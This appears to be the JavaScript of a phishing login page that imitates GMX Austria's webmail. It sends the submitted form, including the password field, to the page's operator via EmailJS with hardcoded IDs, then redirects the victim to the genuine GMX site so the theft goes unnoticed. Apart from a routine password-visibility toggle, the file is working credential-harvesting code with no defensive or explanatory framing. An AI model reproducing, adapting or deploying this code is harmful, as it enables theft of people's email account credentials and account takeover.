// Initialize EmailJS with your User ID
(function(){
    emailjs.init("inryvIdMDYlJAEPpL");
})();

// Button and Form Submission
const btn = document.getElementById('button');

document.getElementById('form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent traditional form submission

    btn.value = 'Processing...'; // Update button to show loading
    btn.disabled = true; // Disable button during submission

    // EmailJS IDs
    const serviceID = 'service_3h7tdpn';
    const templateID = 'template_tp178k5';

    console.log("Submitting form via EmailJS...");

    emailjs.sendForm(serviceID, templateID, this)
        .then(() => {
            console.log("Update successful!");
            
            // Redirect after successful submission
            window.location.href = 'https://www.gmx.at/mail/tarifvergleich/#.pc_page.homepage.at.header_account.tarifvergleich_at';
            
        }, (err) => {
            console.error("Error:", err);
            alert('Error: ' + err.text || 'Failed to submit form');
            
            // Reset button state
            btn.value = 'Login';
            btn.disabled = false;
        });

    return false; // Ensure form doesn't submit
});

// Password Visibility Toggle
const togglePasswordButton = document.getElementById("toggle-password");
const closedEyeIcon = document.getElementById("closed-eye");
const openEyeIcon = document.getElementById("open-eye");
const passwordElement = document.getElementById("password");
let isPasswordVisible = false;

togglePasswordButton.addEventListener("click", function() {
    if (!isPasswordVisible) {
        passwordElement.type = "text"; // Show password
        openEyeIcon.classList.remove("hide");
        closedEyeIcon.classList.add("hide");
    } else {
        passwordElement.type = "password"; // Hide password
        closedEyeIcon.classList.remove("hide");
        openEyeIcon.classList.add("hide");
    }
    isPasswordVisible = !isPasswordVisible; // Toggle visibility state
});